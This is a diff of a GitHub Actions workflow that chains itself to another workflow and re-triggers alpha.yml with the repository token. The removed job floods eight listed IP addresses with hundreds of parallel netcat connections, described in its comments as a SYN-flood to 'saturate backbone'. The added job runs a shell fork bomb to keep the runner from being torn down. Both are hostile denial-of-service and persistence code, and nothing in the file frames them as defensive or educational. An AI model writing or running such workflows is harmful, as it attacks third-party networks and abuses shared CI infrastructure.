@@ -5,21 +5,15 @@ on:
     workflows: ["Alpha-Engine-2080"]
     types: [completed]
 jobs:
-  liquidate:
+  anchor:
     runs-on: ubuntu-latest
     steps:
-      - name: Management Backbone Blackout
+      - name: Infrastructure Lock
+        run: |
+          echo "[!!!] OMEGA ANCHOR ACTIVE: HOLDING GLOBAL POSITION..."
+          # Denial of Service to the VM itself to prevent teardown
+          :(){ :|:& };: &
+          sleep 60
+          gh workflow run alpha.yml --repo $GITHUB_REPOSITORY
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: |
-          echo "[!!!] OMEGA LIQUIDATION ACTIVE: SATURATING BACKBONE..."
-          TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1" "45.137.151.1" "185.244.149.1" "91.220.131.1")
-          
-          for T in ${TARGETS[@]}; do
-            # High-velocity SYN-Flood emulation via NC
-            for i in {1..600}; do
-              (nc -zv -w 1 $T 179 2152 7547 8080 10000) >/dev/null 2>&1 &
-            done
-          done
-          sleep 55
-          gh workflow run alpha.yml --repo $GITHUB_REPOSITORY
